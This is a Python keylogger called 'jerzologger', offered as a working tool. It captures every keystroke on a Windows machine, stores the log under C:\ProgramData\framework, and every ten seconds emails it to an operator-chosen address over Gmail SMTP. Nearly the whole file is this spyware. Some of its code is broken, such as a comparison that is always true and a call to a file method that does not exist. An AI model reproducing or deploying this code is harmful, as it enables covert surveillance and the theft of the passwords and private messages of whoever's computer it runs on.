import pynput
import datetime
import ctypes
import time
import colorama
import sys
import os
import smtplib
import os.path
import subprocess
import schedule
import datetime

from email import encoders
from colorama import init
from termcolor import colored
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from pynput.keyboard import Key, Listener, Controller
sys.stdout.write("\x1b]2;jerzologger\x07")
# ukrywanie
sender_email = input("enter GMAIL email that you will use to send emails (logs) with. \n Remember to enable less secured apps in your google accoint settings. \n>> ") 
sender_password = input("enter email password. \n >> ")
receiver_email = input('enter email that will recieve emalis (logs). \n >> ')

bruh = open('C:\\ProgramData\\framework\\log.txt', 'a')
bruh.close()


os.system('color 06')
clear = lambda: os.system('cls')
clear()
init()
keyboard = Controller()
count = 0
keys = []
now = datetime.now()

#jerzologger
current_time = now.strftime(colored("%H:%M:%S",'red'))
print(colored("░░░░░██╗███████╗██████╗░███████╗░█████╗░██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░", 'yellow'))
print(colored("░░░░░██║██╔════╝██╔══██╗╚════██║██╔══██╗██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗", 'yellow'))
print(colored("░░░░░██║█████╗░░██████╔╝░░███╔═╝██║░░██║██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝", 'yellow'))
print(colored("██╗░░██║██╔══╝░░██╔══██╗██╔══╝░░██║░░██║██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗", 'yellow'))
print(colored("╚█████╔╝███████╗██║░░██║███████╗╚█████╔╝███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║", 'yellow'))
print(colored("░╚════╝░╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝", 'yellow'))
print("by techni49 and jerzycki")
print("launch date =", current_time)


#keylogger
    
def on_press(key):
    
    schedule.run_pending()
    global keys, count
    keys.append(key)
    count += 1
    print(colored("[jerzologger] key {0} has been pressed".format(key), 'yellow'))

    if count >- 10: 
        count = 0
        write_file(keys)
        
#pisanie loga
def write_file(keys):
    with open("C:\\programdata\\framework\\log.txt", "a") as f:
        for key in keys:
            
            if key == Key.space:
                f.write("   ")

            elif key == Key.enter:
                f.write('\n [ENTER] \n')

            elif key == Key.cmd:
                f.write("[windows button]")

            elif key == Key.shift_r:
                f.write("[R shift]")
                f.close()
            elif key == Key.shift:
                f.write("[L shift]")

            elif key == Key.backspace:
                f.write("[BACK SPACE]")

            elif key ==Key.ctrl_l:
                f.write("[Left ctrl]")

            elif key ==Key.ctrl_r:
                f.pwrite("[Right ctrl]")
            
            elif key == Key.alt_gr:
                f.write("[Alt Gr]")
                
            elif key == Key.alt_l:
                f.write('[Alt]')
                  
            else:        
                f.write(str(key))


def on_release(key):
    if key == Key.esc:
        return False
               
def mail():
    
    message = MIMEMultipart()
    message["From"] = sender_email
    message['To'] = receiver_email
    message['Subject'] = ("log")
    
    file = ("GG.txt ")
    attachment = open("C:\\programdata\\framework\\log.txt", 'rb')
    obj = MIMEBase('application','octet-stream')

    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition',"attachment; filename= "+file)

    message.attach(obj)
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.gmail.com',587)
    email_session.starttls()
    email_session.login(sender_email,sender_password)

    email_session.sendmail(sender_email,receiver_email,my_message)   
    print(colored("mail has been sent", 'red'))
   
schedule.every(10).seconds.do(mail)

#
#
#

                

with Listener(on_press =on_press) as listener:
    listener.join()
